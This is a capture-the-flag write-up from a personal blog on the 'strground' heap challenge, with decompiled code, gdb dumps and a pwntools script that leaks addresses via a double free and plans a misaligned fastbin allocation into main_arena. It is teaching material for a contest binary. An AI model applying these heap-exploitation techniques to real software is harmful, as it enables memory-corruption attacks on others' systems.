<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="theme-color" content="#2ecc71">





<title>UNbreakable International 2024 - strground | kileak</title>





<meta name="description" content="UNbreakable International 2024 - strground">


<meta name="keywords" content="unbreakable, strground">



<link rel="stylesheet" href="/css/main.css">









<link rel="canonical" href="https://kileak.github.io/ctf/2024/unbreakable-strground-copy-2/">
<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />



<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-4PGFKKP0QW');
</script>


<script>base_url = "";</script>

  </head>
  <body class="">

    <main class="main-container">

        <header class="site-header">

  <div class="container txt-center">
    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
      <span></span>
      <span></span>
      <span></span>
    </a>

    <nav class="js-menu sliding-panel-content">
      <ul>
        <li><a href="/">home</a></li>
        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
      </ul>
    </nav>
    <div class="js-menu-screen sliding-panel-fade-screen"></div>

    <a href="/" class="author-thumb dot">
      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
    </a>

    <!--
    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
    </a>
    -->

    
      <h1 class="post-title">UNbreakable International 2024 - strground</h1>
      <p class="post-meta">Mar 24, 2024</p>
    

  </div>

</header>


        <section class="main-content">
          <article class="post">

  <div class="post-content container">
    <blockquote>
  <p>UNbreakable International 2024 - strground
<!--break--></p>

  <p>Solves: 1 (hard - 500)</p>

  <p>A true battle is always held in arena.</p>

  <p>Author: Luma</p>

  <p>Team: Weak But Leet</p>

  <p>Attachment: 
<a href="https://kileak.github.io/assets/unbreakable24/strground/strground.zip">strground.zip</a> 
<a href="https://kileak.github.io/assets/unbreakable24/strground/xpl.py">xpl.py</a></p>
</blockquote>

<p><code class="language-plaintext highlighter-rouge">strground</code> was an interesting challenge with some twists. The attachment provided a <code class="language-plaintext highlighter-rouge">libc-2.30.so</code> and the binary contained an obvious double free bug with leaks.</p>

<p>So normally this should be super easy, just poisoning tcache and be good to go.</p>

<p>But the libc seemed to be patched to disable tcache, which leads to a rather weird situation: 
We’ll not be able to use any tcache attacks, but at the same time have to get around the new security restrictions of <code class="language-plaintext highlighter-rouge">2.30</code> libc, which also makes normal heap attacks harder (top size checks, etc.).</p>

<p>Since there were no other solves to this challenge, I decided to do a writeup on it, though I’d love to see, if there’s an easier solution than this :)</p>

<p>Let’s take a look at the implementation</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// Read command</span>
<span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x5f</span><span class="p">);</span>

<span class="c1">// Check for CREATE command</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">strncmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="s">"CREATE "</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="mh">0xe</span> <span class="o">&lt;</span> <span class="n">idx</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Maximum number of strings created."</span><span class="p">);</span>            
  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Check size of string to create (max 0x5f-7)</span>
<span class="k">for</span> <span class="p">(</span><span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'\n'</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">k</span> <span class="o">&lt;</span> <span class="mh">0x5f</span><span class="p">));</span> <span class="n">k</span> <span class="o">=</span> <span class="n">k</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
<span class="p">}</span>
<span class="n">k</span> <span class="o">=</span> <span class="n">k</span> <span class="o">+</span> <span class="o">-</span><span class="mi">7</span><span class="p">;</span>
<span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">7</span><span class="p">,(</span><span class="kt">long</span><span class="p">)</span><span class="n">k</span><span class="p">);</span>

<span class="c1">// Allocate chunk for string</span>
<span class="n">str_chunk</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">((</span><span class="kt">long</span><span class="p">)</span><span class="n">k</span><span class="p">);</span>

<span class="c1">// Put string chunk into string table</span>
<span class="n">str_table</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">str_chunk</span><span class="p">;</span>
<span class="n">memcpy</span><span class="p">(</span><span class="n">str_table</span><span class="p">[</span><span class="n">idx</span><span class="p">],</span><span class="n">buf</span><span class="p">,(</span><span class="kt">long</span><span class="p">)</span><span class="n">k</span><span class="p">);</span>

<span class="c1">// Mark string as used</span>
<span class="n">str_inuse</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">str_inuse</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="n">idx</span> <span class="o">=</span> <span class="n">idx</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
<span class="n">puts</span><span class="p">(</span><span class="s">"Created string."</span><span class="p">);</span></code></pre></figure>

<p>The binary reads a command with size <code class="language-plaintext highlighter-rouge">0x5f</code> and then checks, which command we want to execute. For <code class="language-plaintext highlighter-rouge">CREATE</code> it will take the rest of the string and 
calculate the length of a string. The way it does this will restrain the maximum size, we can allocate to <code class="language-plaintext highlighter-rouge">0x5f-7</code>.</p>

<p>This is another constraint, the author seemed to put in to avoid that we do a simple misaligned allocation into <code class="language-plaintext highlighter-rouge">__malloc_hook</code>. To be able to do this, we’d need to be able to allocate <code class="language-plaintext highlighter-rouge">0x70</code> fastbins, which we cannot do because of this. So another simple attack primitive is cancelled out.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// Check for ENCODE command</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">strncmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="s">"ENCODE "</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">7</span><span class="p">);</span>

  <span class="c1">// Get index from command</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(((</span><span class="mh">0xe</span> <span class="o">&lt;</span> <span class="n">result</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;</span> <span class="sc">'0'</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="sc">'9'</span> <span class="o">&lt;</span> <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Not a valid number."</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">str_inuse</span><span class="p">[</span><span class="n">result</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Can</span><span class="se">\'</span><span class="s">t encode something that doesn</span><span class="se">\'</span><span class="s">t exist."</span><span class="p">);</span>            
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
  
  <span class="c1">// Copy string into encoding buffer</span>
  <span class="n">str_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">str_table</span><span class="p">[</span><span class="n">result</span><span class="p">]);</span>
  <span class="n">strncpy</span><span class="p">(</span><span class="n">encodebuf</span><span class="p">,</span><span class="n">str_table</span><span class="p">[</span><span class="n">result</span><span class="p">],</span><span class="n">str_len</span><span class="p">);</span>

  <span class="c1">// Add 0x3 to every byte</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">encodebuf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'\0'</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">encodebuf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">encodebuf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="sc">'\x03'</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Encoded your string!</span><span class="se">\n</span><span class="s">%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">encodebuf</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<p>The <code class="language-plaintext highlighter-rouge">ENCODE</code> command just takes the string buffer and adds <code class="language-plaintext highlighter-rouge">0x3</code> to every byte and then prints it out. We can use this function to leak data from the stack, we just have to keep in mind to reverse this to get the proper output.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// DELETE command</span>
<span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">7</span><span class="p">);</span>
<span class="n">idx</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(((</span><span class="mh">0xe</span> <span class="o">&lt;</span> <span class="n">idx</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;</span> <span class="sc">'0'</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="sc">'9'</span> <span class="o">&lt;</span> <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="k">break</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="n">str_inuse</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Can</span><span class="se">\'</span><span class="s">t delete something that doesn</span><span class="se">\'</span><span class="s">t exist."</span><span class="p">);</span>            
  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Free the chunk (not zeroing it out =&gt; UAF)</span>
<span class="n">free</span><span class="p">(</span><span class="n">str_table</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"Deleted %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">idx</span><span class="p">);</span></code></pre></figure>

<p><code class="language-plaintext highlighter-rouge">DELETE</code> just frees the chunk, but doesn’t clear it from the table, by which we get a UAF with which we can easily double free and leak from chunks.</p>

<p>Before getting into the exploitation itself, let’s get some proper leaks. Since the buffer for the input command isn’t initialized, we might get some out of it.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffe270  →  0x0000000000000a63 ("c\n"?)
$rbx   : 0x0               
$rcx   : 0x00007ffff7b030c3  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0x5f              
$rsp   : 0x00007fffffffe1a0  →  0x0000000ff7ffe730
$rbp   : 0x00007fffffffe2f0  →  0x0000555555401060  →  &lt;__libc_csu_init+0&gt; push r15
$rsi   : 0x00007fffffffe270  →  0x0000000000000a63 ("c\n"?)
$rdi   : 0x0               
$rip   : 0x0000555555400b9e  →  &lt;main+211&gt; call 0x5555554008f0 &lt;read@plt&gt;
$r8    : 0x0000555555603010  →  0x0000000000000000
$r9    : 0x3               
$r10   : 0xa0              
$r11   : 0x246             
$r12   : 0x0000555555400960  →  &lt;_start+0&gt; xor ebp, ebp
$r13   : 0x00007fffffffe3d0  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555400b91 &lt;main+198&gt;       mov    edx, 0x5f
   0x555555400b96 &lt;main+203&gt;       mov    rsi, rax
   0x555555400b99 &lt;main+206&gt;       mov    edi, 0x0
 → 0x555555400b9e &lt;main+211&gt;       call   0x5555554008f0 &lt;read@plt&gt;
   ↳  0x5555554008f0 &lt;read@plt+0&gt;     jmp    QWORD PTR [rip+0x2016b2]        # 0x555555601fa8 &lt;read@got.plt&gt;
      0x5555554008f6 &lt;read@plt+6&gt;     push   0x7
      0x5555554008fb &lt;read@plt+11&gt;    jmp    0x555555400870
      0x555555400900 &lt;memcpy@plt+0&gt;   jmp    QWORD PTR [rip+0x2016aa]        # 0x555555601fb0 &lt;memcpy@got.plt&gt;
      0x555555400906 &lt;memcpy@plt+6&gt;   push   0x8
      0x55555540090b &lt;memcpy@plt+11&gt;  jmp    0x555555400870
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe1a0│+0x0000: 0x0000000ff7ffe730	 ← $rsp
0x00007fffffffe1a8│+0x0008: 0x00007fff0000000f
0x00007fffffffe1b0│+0x0010: 0x00007ffff7ffeac0  →  0x00007ffff7ffe9f0  →  0x00007ffff7ffe758  →  0x00007ffff7ffe730  →  0x00007ffff7ffa000  →  0x00010102464c457f
0x00007fffffffe1b8│+0x0018: 0x00007ffff7ddfee0  →  0xb874c08530c48348
0x00007fffffffe1c0│+0x0020: 0x000000000000000f
0x00007fffffffe1c8│+0x0028: 0x0000555555603010  →  0x0000000000000000
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
read@plt (
   $rdi = 0x0000000000000000,
   $rsi = 0x00007fffffffe270 → 0x0000000000000a63 ("c\n"?),
   $rdx = 0x000000000000005f
)
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/30gx $rsi

0x7fffffffe270:	0x0000000000000a63	0x0000000000000000
0x7fffffffe280:	0x0000000000000000	0x0000000000f0b5ff
0x7fffffffe290:	0x00000000000000c2	0x00007fffffffe2ce &lt;= stack address
0x7fffffffe2a0:	0x0000000000000001	0x00007ffff7dd5308 &lt;= libc address
0x7fffffffe2b0:	0x0000000000000001	0x00005555554010ad &lt;= elf address
0x7fffffffe2c0:	0x0000000000000000	0x0000000000000000
0x7fffffffe2d0:	0x0000555555401060	0x761d364ceed02b00
0x7fffffffe2e0:	0x00007fffffffe3d0	0x0000000000000000
0x7fffffffe2f0:	0x0000555555401060	0x00007ffff7a3e037</code></pre></figure>

<p>So we have a stack, libc and elf address inside the input buffer, which we can leak by creating <code class="language-plaintext highlighter-rouge">aligned</code> commands, so that <code class="language-plaintext highlighter-rouge">strncpy</code> will also copy those addresses into our string on the heap. We can then retrieve them via <code class="language-plaintext highlighter-rouge">encode</code>.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">HOST</span> <span class="o">=</span> <span class="s">"35.234.88.19"</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">31273</span>
<span class="n">PROCESS</span> <span class="o">=</span> <span class="s">"./chall"</span>


<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"CREATE %s"</span> <span class="o">%</span> <span class="n">msg</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"PRINT %s"</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
    <span class="n">LEAK</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">LEAK</span>


<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"DELETE %s"</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">encode</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"ENCODE %s"</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="n">LEAK</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

    <span class="n">result</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">LEAK</span><span class="p">:</span>
        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">((</span><span class="nb">ord</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span><span class="o">-</span><span class="mi">3</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">result</span>


<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
    <span class="c1"># create aligned string to leak stack
</span>    <span class="n">create</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x21</span><span class="p">)</span>          <span class="c1"># 0
</span>
    <span class="n">STACKLEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">encode</span><span class="p">(</span><span class="mi">0</span><span class="p">)[</span><span class="mh">0x21</span><span class="p">:</span><span class="mh">0x21</span><span class="o">+</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"STACK leak      : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">STACKLEAK</span><span class="p">))</span>

    <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

    <span class="c1"># create aligned string to leak libc
</span>    <span class="n">create</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x2b</span><span class="p">)</span>          <span class="c1"># 0 / 1
</span>    <span class="n">LIBCLEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">encode</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="mh">0x2a</span><span class="p">:</span><span class="mh">0x2a</span><span class="o">+</span><span class="mi">6</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span><span class="o">-</span><span class="mh">0x41</span>
    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">LIBCLEAK</span> <span class="o">-</span> <span class="mh">0x3b9300</span>

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC leak       : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBCLEAK</span><span class="p">))</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC            : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>

    <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

    <span class="c1"># create aligned string to leak pie
</span>    <span class="n">create</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x2b</span><span class="o">+</span><span class="mi">8</span><span class="p">))</span>      <span class="c1"># 0 / 2
</span>    <span class="n">PIELEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">encode</span><span class="p">(</span><span class="mi">2</span><span class="p">)[</span><span class="mh">0x33</span><span class="p">:</span><span class="mh">0x33</span><span class="o">+</span><span class="mi">6</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"PIE leak        : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PIELEAK</span><span class="p">))</span>

    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

    <span class="k">return</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>

    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./chall"</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
        <span class="n">pause</span><span class="p">()</span>

    <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] STACK leak     : 0x7fffffffe2ce
[*] LIBC leak      : 0x7ffff7dd5300
[*] LIBC           : 0x7ffff7a1c000
[*] PIE leak       : 0x5555554010ad</code></pre></figure>

<p>Getting a <code class="language-plaintext highlighter-rouge">heap</code> leak is pretty simple due to the fact that we can do double frees.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">create</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x50</span><span class="p">)</span>          <span class="c1"># 3
</span>
<span class="c1"># free two chunks, to fill a freed fd to leak
</span><span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">HEAPLEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">encode</span><span class="p">(</span><span class="mi">0</span><span class="p">)[:</span><span class="mi">6</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
<span class="n">HEAPBASE</span> <span class="o">=</span> <span class="n">HEAPLEAK</span><span class="o">-</span><span class="mh">0xe0</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"HEAP leak      : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">HEAPLEAK</span><span class="p">))</span></code></pre></figure>

<p>With this we should have all the leaks we’d possibly need to tackle this.</p>

<p>Like already mentioned, we can only create chunks with a max size of <code class="language-plaintext highlighter-rouge">0x58</code>, so we’ll not be able to create <code class="language-plaintext highlighter-rouge">0x70</code> fastbins, so misaligned allocation into <code class="language-plaintext highlighter-rouge">__malloc_hook</code> won’t work. We also don’t have <code class="language-plaintext highlighter-rouge">tcache arena</code>, so all of the usual <code class="language-plaintext highlighter-rouge">tcache</code> stuff won’t work also.</p>

<p>At that point, I created some fake unsorted bin chunks on the heap and did backwards consolidation into the string table itself, which then gives us a nice primitive, since we then control the complete string table, but that didn’t seem to help us much, since we then still can only show or delete valid chunks (which was already possible without this).</p>

<p>Since this didn’t really add any value, I went back to the start and checked what else we can do. Then I remembered a little trick <code class="language-plaintext highlighter-rouge">uafio</code> and me used in some older challenges, when <code class="language-plaintext highlighter-rouge">tcache</code> wasn’t a thing.</p>

<p>Though misaligned allocation into <code class="language-plaintext highlighter-rouge">__malloc_hook</code> doesn’t work, since we would need a <code class="language-plaintext highlighter-rouge">0x70</code> chunk for it, we can create and free <code class="language-plaintext highlighter-rouge">0x50</code> chunks. Since freeing a fastbin on the heap will put the address into <code class="language-plaintext highlighter-rouge">main_arena</code>, we can then do a misaligned allocation with that address.</p>

<p>We have already a freed <code class="language-plaintext highlighter-rouge">0x60</code> fastbin in <code class="language-plaintext highlighter-rouge">main_arena</code>, let’s take a look at it.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x7ffff7dd0b50
0x7ffff7dd0b50:	0x0000000000000000	0x0000000000000000
0x7ffff7dd0b60:	0x0000000000000000	0x0000000000000001
0x7ffff7dd0b70:	0x0000000000000000	0x0000000000000000
0x7ffff7dd0b80:	0x0000000000000000	0x0000000000000000
0x7ffff7dd0b90:	0x0000555555603080	0x0000000000000000 &lt;= 0x60 fastbin
0x7ffff7dd0ba0:	0x0000000000000000	0x0000000000000000
0x7ffff7dd0bb0:	0x0000000000000000	0x0000000000000000
0x7ffff7dd0bc0:	0x0000555555603140	0x0000000000000000 &lt;= top / remainder
0x7ffff7dd0bd0:	0x00007ffff7dd0bc0	0x00007ffff7dd0bc0
0x7ffff7dd0be0:	0x00007ffff7dd0bd0	0x00007ffff7dd0bd0

gef➤  x/30gx 0x7ffff7dd0b80+13
0x7ffff7dd0b8d:	0x5555603080000000	0x0000000000000055 &lt;= misaligned chunk
0x7ffff7dd0b9d:	0x0000000000000000	0x0000000000000000
0x7ffff7dd0bad:	0x0000000000000000	0x0000000000000000
0x7ffff7dd0bbd:	0x5555603140000000	0x0000000000000055
0x7ffff7dd0bcd:	0xfff7dd0bc0000000	0xfff7dd0bc000007f
0x7ffff7dd0bdd:	0xfff7dd0bd000007f	0xfff7dd0bd000007f
0x7ffff7dd0bed:	0xfff7dd0be000007f	0xfff7dd0be000007f</code></pre></figure>

<p>So, this looks almost like a possible target for allocating a <code class="language-plaintext highlighter-rouge">0x50</code> fastbin into, though a size of <code class="language-plaintext highlighter-rouge">0x55</code> is not a valid size for a fastbin. But when we’ll re-enable <code class="language-plaintext highlighter-rouge">ASLR</code> there’s a 50/50 chance, that the heap address will not start with <code class="language-plaintext highlighter-rouge">0x55</code>, but with <code class="language-plaintext highlighter-rouge">0x56</code>, which IS a valid fastbin size.</p>

<p>This enables us to to do a double free on <code class="language-plaintext highlighter-rouge">0x50</code> chunks, overwrite the freed <code class="language-plaintext highlighter-rouge">FD</code> and allocate into this misaligned chunk, by which we can then overwrite stuff in <code class="language-plaintext highlighter-rouge">main_arena</code> itself (like for example the <code class="language-plaintext highlighter-rouge">top</code> pointer).</p>

<p>Again, the allocation will fail, if the heap address starts with <code class="language-plaintext highlighter-rouge">0x55</code> and only with ASLR enabled, there’s a chance that it starts with <code class="language-plaintext highlighter-rouge">0x56</code>.</p>

<p>For having an easier time debugging this, I’ll keep ASLR disabled for now and manually overwrite the chunk size within gdb to simulate a successful ASLR run.</p>

